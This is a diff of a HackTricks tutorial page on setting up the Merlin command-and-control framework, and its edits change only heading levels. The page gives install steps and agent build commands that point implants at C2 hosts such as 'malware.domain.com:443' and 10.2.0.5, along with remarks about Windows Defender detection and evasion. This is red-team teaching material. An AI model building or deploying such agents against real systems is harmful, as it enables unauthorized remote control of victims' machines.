@@ -17,11 +17,9 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Merlin
+# Installation
 
-## Installation
-
-### Install GO
+## Install GO
 
 ```
 #Download GO package from: https://golang.org/dl/
@@ -36,24 +34,24 @@ Add "export GOBIN=$GOPATH/bin"
 source /etc/profile
 ```
 
-### Install Merlin
+## Install Merlin
 
 ```
 go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
 cd $GOPATH/src/github.com/Ne0nd0g/merlin/
 ```
 
-## Launch Merlin Server
+# Launch Merlin Server
 
 ```
 go run cmd/merlinserver/main.go -i
 ```
 
-## Merlin Agents
+# Merlin Agents
 
 You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)
 
-### Compile Agents
+## Compile Agents
 
 Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_
 
@@ -64,13 +62,13 @@ make windows #Server and Agents for Windows
 make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
 ```
 
-### **Manual compile agents**
+## **Manual compile agents**
 
 ```
 GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
 ```
 
-## Modules
+# Modules
 
 **The bad news is that every module used by Merlin is downloaded from the source (github) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**\
 
@@ -103,7 +101,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -
 
 **Didn't check persistence modules**
 
-## Resume
+# Resume
 
 I really like the feeling and the potential of the tool.\
 I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.
